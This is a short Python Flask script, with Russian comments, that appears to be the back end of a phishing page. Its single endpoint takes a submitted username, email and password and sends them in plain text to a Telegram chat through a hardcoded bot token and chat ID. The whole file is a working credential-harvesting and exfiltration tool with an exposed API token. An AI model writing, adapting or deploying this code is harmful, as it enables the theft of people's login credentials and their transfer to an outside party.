from flask import Flask, request
import requests

app = Flask(__name__)

# Замените на свои значения
TOKEN = '6085931159:AAFjUMzs7bS6Wvkf-p4jxuDBUzNu09DZ-O8'
CHAT_ID = '1129521727'

@app.route('/index', methods=['POST'])
def send_to_telegram():
    username = request.form['username']
    mail = request.form['mail']
    password = request.form['password']
    
    # Формируем текст сообщения
    message = f"Имя пользователя: {username}\nТелефон: {mail}\nПароль: {password}"
    
    # Отправляем сообщение в Telegram
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        'chat_id': CHAT_ID,
        'text': message
    }
    response = requests.post(url, data=data)
    
    if response.ok:
        return 'Данные отправлены в Telegram!'
    else:
        return 'Ошибка отправки данных в Telegram.'

if __name__ == '__main__':
    app.run()
